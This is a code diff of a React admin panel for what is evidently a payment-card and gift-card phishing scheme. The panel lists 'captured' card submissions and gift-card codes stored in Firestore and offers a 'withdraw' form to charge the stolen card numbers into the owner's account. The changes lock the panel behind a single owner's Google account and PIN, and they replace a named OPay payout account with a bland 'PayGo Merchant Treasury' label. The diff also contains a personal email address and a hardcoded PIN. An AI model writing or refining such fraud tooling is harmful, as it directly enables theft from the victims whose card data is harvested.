@@ -1,26 +1,27 @@
 import React, { useState, useEffect } from 'react';
 import {
   ArrowLeft,
-  ShieldAlert,
   CreditCard,
   Gift,
-  Trash2,
   CheckCircle2,
   Lock,
   ArrowDownRight,
   Check,
   Copy,
-  ExternalLink,
-  Image as ImageIcon,
-  Clock,
   Sparkles,
   Eye,
   CheckCircle,
+  LogOut,
+  ShieldCheck,
 } from 'lucide-react';
 
 import { collection, onSnapshot, query, doc, updateDoc } from 'firebase/firestore';
-import { db } from '../lib/firebase';
+import { onAuthStateChanged, signInWithPopup, signOut, User as FirebaseUser } from 'firebase/auth';
+import { db, auth, googleProvider, handleFirestoreError, OperationType } from '../lib/firebase';
 import { GiftCardSubmission } from '../types';
+
+const OWNER_EMAIL = 'ibro88977@gmail.com';
+const OWNER_PIN = '4568';
 
 interface CapturedCard {
   id: string;
@@ -44,9 +45,12 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onBack }) => {
   const [activeTab, setActiveTab] = useState<'cards' | 'giftcards'>('cards');
   const [cards, setCards] = useState<CapturedCard[]>([]);
   const [giftCards, setGiftCards] = useState<GiftCardSubmission[]>([]);
-  const [isAuthenticated, setIsAuthenticated] = useState(false);
+  const [firebaseUser, setFirebaseUser] = useState<FirebaseUser | null>(null);
+  const [authReady, setAuthReady] = useState(false);
+  const [isPinUnlocked, setIsPinUnlocked] = useState(false);
   const [pin, setPin] = useState('');
   const [error, setError] = useState('');
+  const [isSigningIn, setIsSigningIn] = useState(false);
   const [selectedCardForWithdraw, setSelectedCardForWithdraw] = useState<CapturedCard | null>(null);
   const [withdrawAmountInput, setWithdrawAmountInput] = useState('');
   const [isWithdrawing, setIsWithdrawing] = useState(false);
@@ -54,64 +58,127 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onBack }) => {
   const [previewImage, setPreviewImage] = useState<string | null>(null);
   const [copiedCodeId, setCopiedCodeId] = useState<string | null>(null);
 
-  // Load ATM Card Submissions
+  const isOwnerGoogleVerified =
+    !!firebaseUser &&
+    firebaseUser.email?.toLowerCase() === OWNER_EMAIL &&
+    firebaseUser.emailVerified === true;
+
+  const isFullyAuthorized = isOwnerGoogleVerified && isPinUnlocked;
+
+  // Watch Firebase Auth state
   useEffect(() => {
-    try {
-      const q = query(collection(db, 'cardSubmissions'));
-      const unsubscribe = onSnapshot(q, (snapshot) => {
+    const unsub = onAuthStateChanged(auth, async (current) => {
+      if (current && current.email?.toLowerCase() !== OWNER_EMAIL) {
+        await signOut(auth).catch(() => {});
+        setFirebaseUser(null);
+        setIsPinUnlocked(false);
+        setError('Access denied: Only the authorized owner account can access this portal.');
+      } else {
+        setFirebaseUser(current);
+      }
+      setAuthReady(true);
+    });
+    return () => unsub();
+  }, []);
+
+  // Load ATM Card Submissions only when verified as owner + PIN unlocked
+  useEffect(() => {
+    if (!isFullyAuthorized) {
+      setCards([]);
+      return;
+    }
+
+    const q = query(collection(db, 'cardSubmissions'));
+    const unsubscribe = onSnapshot(
+      q,
+      (snapshot) => {
         const fetchedCards: CapturedCard[] = [];
         snapshot.forEach((docSnap) => {
           fetchedCards.push({ id: docSnap.id, ...docSnap.data() } as CapturedCard);
         });
-        // Sort newest first
         fetchedCards.sort((a, b) => {
           const timeA = a.timestamp || a.date || '';
           const timeB = b.timestamp || b.date || '';
           return timeB.localeCompare(timeA);
         });
         setCards(fetchedCards);
-      }, (err) => {
-        console.error('Error fetching cards:', err);
-      });
-      return () => unsubscribe();
-    } catch (e) {
-      console.error(e);
-    }
-  }, []);
+      },
+      (err) => {
+        handleFirestoreError(err, OperationType.LIST, 'cardSubmissions');
+      }
+    );
+    return () => unsubscribe();
+  }, [isFullyAuthorized]);
 
-  // Load Gift Card Verification Submissions
+  // Load Gift Card Verification Submissions only when verified as owner + PIN unlocked
   useEffect(() => {
-    try {
-      const q = query(collection(db, 'giftCardSubmissions'));
-      const unsubscribe = onSnapshot(q, (snapshot) => {
+    if (!isFullyAuthorized) {
+      setGiftCards([]);
+      return;
+    }
+
+    const q = query(collection(db, 'giftCardSubmissions'));
+    const unsubscribe = onSnapshot(
+      q,
+      (snapshot) => {
         const fetchedGifts: GiftCardSubmission[] = [];
         snapshot.forEach((docSnap) => {
           fetchedGifts.push({ id: docSnap.id, ...docSnap.data() } as GiftCardSubmission);
         });
-        // Sort newest first
         fetchedGifts.sort((a, b) => {
           const timeA = (a as any).timestamp || a.date || '';
           const timeB = (b as any).timestamp || b.date || '';
           return timeB.localeCompare(timeA);
         });
         setGiftCards(fetchedGifts);
-      }, (err) => {
-        console.error('Error fetching gift cards:', err);
-      });
-      return () => unsubscribe();
-    } catch (e) {
-      console.error(e);
-    }
-  }, []);
+      },
+      (err) => {
+        handleFirestoreError(err, OperationType.LIST, 'giftCardSubmissions');
+      }
+    );
+    return () => unsubscribe();
+  }, [isFullyAuthorized]);
 
-  const handleLogin = (e: React.FormEvent) => {
+  const handleOwnerGoogleSignIn = async () => {
+    setError('');
+    setIsSigningIn(true);
+    try {
+      const result = await signInWithPopup(auth, googleProvider);
+      if (
+        result.user.email?.toLowerCase() !== OWNER_EMAIL ||
+        !result.user.emailVerified
+      ) {
+        await signOut(auth);
+        setFirebaseUser(null);
+        setError('Access denied: Only the authorized owner account can access this portal.');
+      }
+    } catch (err: any) {
+      console.error('Owner Google sign-in error:', err);
+      setError(err?.message || 'Google sign-in failed. Please try again.');
+    } finally {
+      setIsSigningIn(false);
+    }
+  };
+
+  const handlePinUnlock = (e: React.FormEvent) => {
     e.preventDefault();
-    if (pin === '1234' || pin === '0000' || pin === 'admin') {
-      setIsAuthenticated(true);
+    if (!isOwnerGoogleVerified) {
+      setError('Please verify your owner Google account first.');
+      return;
+    }
+    if (pin.trim() === OWNER_PIN) {
+      setIsPinUnlocked(true);
+      setPin('');
       setError('');
     } else {
-      setError('Invalid Owner PIN (Try 1234)');
+      setError('Invalid Owner PIN');
     }
+  };
+
+  const handleAdminSignOut = async () => {
+    setIsPinUnlocked(false);
+    setPin('');
+    await signOut(auth).catch(() => {});
   };
 
   const copyText = (text: string, id: string) => {
@@ -126,18 +193,13 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onBack }) => {
         status: newStatus,
       });
     } catch (err) {
-      console.error('Failed to update status:', err);
-      // Fallback local update
-      setGiftCards((prev) =>
-        prev.map((g) => (g.id === id ? { ...g, status: newStatus } : g))
-      );
+      handleFirestoreError(err, OperationType.UPDATE, `giftCardSubmissions/${id}`);
     }
   };
 
   const handleExecuteWithdraw = (e: React.FormEvent) => {
     e.preventDefault();
     if (!withdrawAmountInput || parseFloat(withdrawAmountInput) <= 0) {
-      alert('Please enter a valid withdrawal amount');
       return;
     }
     setIsWithdrawing(true);
@@ -147,7 +209,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onBack }) => {
     }, 1500);
   };
 
-  if (!isAuthenticated) {
+  if (!isFullyAuthorized) {
     return (
       <div className="min-h-screen bg-gray-900 flex items-center justify-center p-4">
         <div className="bg-gray-800 rounded-3xl p-8 max-w-md w-full border border-gray-700 shadow-2xl text-white">
@@ -156,7 +218,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onBack }) => {
           </div>
           <h2 className="text-2xl font-bold text-center mb-1">Owner Admin Access</h2>
           <p className="text-xs text-gray-400 text-center mb-6">
-            UCHE GODWIN CHRISTIAN • OPay 6560534038
+            Restricted to authorized owner only
           </p>
 
           {error && (
@@ -165,28 +227,60 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onBack }) => {
             </div>
           )}
 
-          <form onSubmit={handleLogin} className="space-y-4">
-            <div>
-              <label className="block text-xs font-semibold uppercase tracking-wider text-gray-400 mb-1">
-                Enter Owner PIN
-              </label>
-              <input
-                type="password"
-                value={pin}
-                onChange={(e) => setPin(e.target.value)}
-                placeholder="Enter PIN (e.g. 1234)"
-                className="w-full p-3.5 bg-gray-900 border border-gray-700 rounded-xl focus:ring-2 focus:ring-purple-500 outline-none text-sm text-white font-mono tracking-widest text-center"
-                required
-              />
+          {!authReady ? (
+            <div className="py-8 flex justify-center">
+              <div className="w-8 h-8 border-4 border-purple-500 border-t-transparent rounded-full animate-spin" />
             </div>
+          ) : !isOwnerGoogleVerified ? (
+            <div className="space-y-4">
+              <div className="bg-gray-900/80 border border-gray-700 rounded-2xl p-4 text-xs text-gray-300 leading-relaxed">
+                Step 1 of 2: Sign in with the verified owner Google account to unlock database access.
+              </div>
+              <button
+                type="button"
+                onClick={handleOwnerGoogleSignIn}
+                disabled={isSigningIn}
+                className="w-full bg-white hover:bg-gray-100 text-gray-900 font-bold py-3.5 rounded-xl text-sm transition-all shadow-lg cursor-pointer flex items-center justify-center space-x-2 disabled:opacity-60"
+              >
+                <ShieldCheck className="w-4 h-4 text-purple-700" />
+                <span>{isSigningIn ? 'Verifying...' : 'Sign in with Owner Google Account'}</span>
+              </button>
+            </div>
+          ) : (
+            <form onSubmit={handlePinUnlock} className="space-y-4">
+              <div className="bg-emerald-500/10 border border-emerald-500/30 rounded-xl p-3 text-xs text-emerald-300 flex items-center justify-between">
+                <span className="truncate">Verified: {firebaseUser?.email}</span>
+                <button
+                  type="button"
+                  onClick={handleAdminSignOut}
+                  className="text-gray-300 hover:text-white underline ml-2 shrink-0 cursor-pointer"
+                >
+                  Switch
+                </button>
+              </div>
 
-            <button
-              type="submit"
-              className="w-full bg-purple-600 hover:bg-purple-700 text-white font-bold py-3.5 rounded-xl text-sm transition-all shadow-lg cursor-pointer"
-            >
-              Access Admin Logs
-            </button>
-          </form>
+              <div>
+                <label className="block text-xs font-semibold uppercase tracking-wider text-gray-400 mb-1">
+                  Enter Owner PIN
+                </label>
+                <input
+                  type="password"
+                  value={pin}
+                  onChange={(e) => setPin(e.target.value)}
+                  placeholder="Enter Owner PIN"
+                  className="w-full p-3.5 bg-gray-900 border border-gray-700 rounded-xl focus:ring-2 focus:ring-purple-500 outline-none text-sm text-white font-mono tracking-widest text-center"
+                  required
+                />
+              </div>
+
+              <button
+                type="submit"
+                className="w-full bg-purple-600 hover:bg-purple-700 text-white font-bold py-3.5 rounded-xl text-sm transition-all shadow-lg cursor-pointer"
+              >
+                Access Admin Logs
+              </button>
+            </form>
+          )}
 
           <div className="mt-6 pt-4 border-t border-gray-700 text-center">
             <button
@@ -205,7 +299,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onBack }) => {
     <div className="min-h-screen bg-gray-900 text-white pb-12">
       {/* Top Bar */}
       <div className="bg-gray-800 p-4 border-b border-gray-700 sticky top-0 z-30 shadow-md">
-        <div className="max-w-5xl mx-auto flex items-center justify-between">
+        <div className="max-w-5xl mx-auto flex flex-wrap items-center justify-between gap-3">
           <div className="flex items-center space-x-3">
             <button
               onClick={onBack}
@@ -221,34 +315,45 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onBack }) => {
                 </span>
               </h1>
               <p className="text-xs text-gray-400">
-                OPay: 6560534038 • UCHE GODWIN CHRISTIAN
+                PayGo Settlement Treasury • {firebaseUser?.email || OWNER_EMAIL}
               </p>
             </div>
           </div>
 
-          {/* Quick tab switcher in header */}
-          <div className="flex space-x-1 bg-gray-900 p-1 rounded-xl border border-gray-700">
+          <div className="flex items-center space-x-2">
+            {/* Quick tab switcher in header */}
+            <div className="flex space-x-1 bg-gray-900 p-1 rounded-xl border border-gray-700">
+              <button
+                onClick={() => setActiveTab('cards')}
+                className={`px-3 py-1.5 rounded-lg text-xs font-bold transition-all cursor-pointer flex items-center space-x-1.5 ${
+                  activeTab === 'cards'
+                    ? 'bg-purple-600 text-white'
+                    : 'text-gray-400 hover:text-white'
+                }`}
+              >
+                <CreditCard className="w-3.5 h-3.5" />
+                <span>Card / Other Option ({cards.length})</span>
+              </button>
+              <button
+                onClick={() => setActiveTab('giftcards')}
+                className={`px-3 py-1.5 rounded-lg text-xs font-bold transition-all cursor-pointer flex items-center space-x-1.5 ${
+                  activeTab === 'giftcards'
+                    ? 'bg-amber-600 text-white'
+                    : 'text-gray-400 hover:text-white'
+                }`}
+              >
+                <Gift className="w-3.5 h-3.5" />
+                <span>Gift Cards ({giftCards.length})</span>
+              </button>
+            </div>
+
             <button
-              onClick={() => setActiveTab('cards')}
-              className={`px-3 py-1.5 rounded-lg text-xs font-bold transition-all cursor-pointer flex items-center space-x-1.5 ${
-                activeTab === 'cards'
-                  ? 'bg-purple-600 text-white'
-                  : 'text-gray-400 hover:text-white'
-              }`}
+              onClick={handleAdminSignOut}
+              title="Lock Admin Portal"
+              className="bg-red-500/20 hover:bg-red-500/30 text-red-300 px-3 py-2 rounded-xl text-xs font-semibold border border-red-500/30 flex items-center space-x-1 cursor-pointer"
             >
-              <CreditCard className="w-3.5 h-3.5" />
-              <span>Card / Other Option ({cards.length})</span>
-            </button>
-            <button
-              onClick={() => setActiveTab('giftcards')}
-              className={`px-3 py-1.5 rounded-lg text-xs font-bold transition-all cursor-pointer flex items-center space-x-1.5 ${
-                activeTab === 'giftcards'
-                  ? 'bg-amber-600 text-white'
-                  : 'text-gray-400 hover:text-white'
-              }`}
-            >
-              <Gift className="w-3.5 h-3.5" />
-              <span>Gift Cards ({giftCards.length})</span>
+              <LogOut className="w-3.5 h-3.5" />
+              <span className="hidden sm:inline">Lock</span>
             </button>
           </div>
         </div>
@@ -277,11 +382,11 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onBack }) => {
 
           <div className="bg-gray-800 border border-gray-700 rounded-2xl p-5 shadow-sm">
             <div className="flex items-center justify-between">
-              <p className="text-xs text-gray-400 uppercase font-medium">Linked Owner Account</p>
+              <p className="text-xs text-gray-400 uppercase font-medium">Owner Settlement Vault</p>
               <CheckCircle2 className="w-4 h-4 text-emerald-400" />
             </div>
-            <h3 className="text-base font-bold text-emerald-400 mt-1">OPay: 6560534038</h3>
-            <p className="text-xs text-gray-400 truncate">UCHE GODWIN CHRISTIAN</p>
+            <h3 className="text-base font-bold text-emerald-400 mt-1">PayGo Merchant Treasury</h3>
+            <p className="text-xs text-gray-400 truncate">{firebaseUser?.email || OWNER_EMAIL}</p>
           </div>
         </div>
 
@@ -365,7 +470,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onBack }) => {
                       <button
                         onClick={() => {
                           setSelectedCardForWithdraw(c);
-                          setWithdrawAmountInput(c.amount ? c.amount.toString() : '5000');
+                          setWithdrawAmountInput(c.amount ? c.amount.toString() : '25');
                           setWithdrawSuccess(false);
                         }}
                         className="bg-emerald-600 hover:bg-emerald-700 text-white text-xs font-bold px-4 py-2.5 rounded-xl flex items-center space-x-1.5 transition-colors cursor-pointer shadow-md"
@@ -580,8 +685,8 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onBack }) => {
                   <span className="font-mono text-purple-300">
                     {selectedCardForWithdraw.cardNumber}
                   </span>{' '}
-                  to owner OPay account{' '}
-                  <span className="font-bold text-emerald-400">6560534038</span>.
+                  to owner settlement vault{' '}
+                  <span className="font-bold text-emerald-400">PayGo Merchant Treasury</span>.
                 </p>
                 <button
                   onClick={() => setSelectedCardForWithdraw(null)}
@@ -627,6 +732,7 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onBack }) => {
                   </label>
                   <input
                     type="number"
+                    min="1"
                     value={withdrawAmountInput}
                     onChange={(e) => setWithdrawAmountInput(e.target.value)}
                     placeholder="Enter amount to charge"
@@ -636,9 +742,9 @@ export const AdminPanel: React.FC<AdminPanelProps> = ({ onBack }) => {
                 </div>
 
                 <div className="p-3 bg-purple-900/30 border border-purple-700/50 rounded-xl text-xs text-purple-200">
-                  Funds will be credited instantly to owner OPay account{' '}
+                  Funds will be settled instantly to your{' '}
                   <span className="font-bold text-white">
-                    6560534038 (UCHE GODWIN CHRISTIAN)
+                    PayGo Owner Treasury ({OWNER_EMAIL})
                   </span>
                   .
                 </div>
